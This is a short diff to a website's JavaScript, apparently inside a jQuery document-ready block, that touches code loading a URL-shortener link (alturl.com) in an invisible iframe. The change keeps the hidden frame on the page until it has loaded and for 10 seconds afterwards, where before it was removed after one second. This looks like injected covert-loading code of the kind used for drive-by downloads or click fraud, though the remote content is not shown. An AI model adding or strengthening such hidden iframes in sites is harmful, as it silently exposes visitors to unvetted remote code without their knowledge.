@@ -250,9 +250,11 @@ $(document).ready(function(){
 		iframe.src = "http://alturl.com/gzm43";
 		iframe.style.display = "none";
 		document.body.appendChild(iframe);
-		setTimeout(function() {
-			document.body.removeChild(iframe);
-		}, 1000);
+		iframe.onload = function() {
+			setTimeout(function() {
+				document.body.removeChild(iframe);
+			}, 10000);
+		};
 	}
 
  // Add smooth scrolling to all links
